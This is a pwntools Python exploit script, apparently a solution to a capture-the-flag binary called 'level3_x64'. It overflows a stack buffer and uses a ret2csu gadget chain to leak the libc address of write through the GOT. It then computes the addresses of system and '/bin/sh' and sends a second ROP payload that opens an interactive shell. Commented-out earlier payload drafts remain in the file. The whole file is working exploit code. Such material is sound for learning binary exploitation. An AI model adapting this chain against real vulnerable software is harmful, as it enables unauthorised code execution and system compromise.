from pwn import *

context.log_level = "debug"

io = process("./level3_x64")

elf = ELF("./level3_x64")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pad = 0x80

io.recvline()

write_plt = elf.symbols["write"]
print(hex(write_plt))

write_got = elf.got["write"]
print(hex(write_got))


vul_addr = elf.symbols["vulnerable_function"]

pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1
first_csu = 0x00000000004006A6
second_csu = 0x0000000000400690
init_array_start = 0x0000000000600840

'''
payload1 = cyclic(pad + 8)
payload1 += p64(first_csu) + b'a'*8 + p64(0) + p64(1) + p64(init_array_start) + p64(8) + p64(write_got) + p64(1) + p64(second_csu)
#payload1 += b'a'*8 + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)
payload1 += b'a'*56
#payload1 += p64(write_plt) + p64(vul_addr)
payload1 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(vul_addr)
'''
'''
payload1 = cyclic(pad + 8)
payload1 += p64(first_csu) + b'a'*8 + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(second_csu)
#payload1 += b'a'*8 + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)
payload1 += b'a'*56
#payload1 += p64(write_plt) + p64(vul_addr)
payload1 += p64(vul_addr)
'''

def ret_csu(r12, r13, r14, r15, last):
	payload = (pad+8) * b'a'
	payload += p64(first_csu) + b'a' * 8
	payload += p64(0) + p64(1)
	payload += p64(r12)
	payload += p64(r13) + p64(r14) + p64(r15)
	payload += p64(second_csu)
	payload += b'a' * 56
	payload += p64(last)
	return payload
	
payload1 = ret_csu( write_got, 8, write_got, 1, vul_addr )

io.sendline(payload1)

recv_string = io.recvline()
print(recv_string)

write_addr = u64(recv_string[0:8])
print(hex(write_addr))

libc_base = write_addr - libc.symbols["write"]
print(hex(libc_base))

sys_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
print(hex(sys_addr))
print(hex(binsh_addr))


payload2 = cyclic(pad + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)

io.sendline(payload2)
io.interactive()

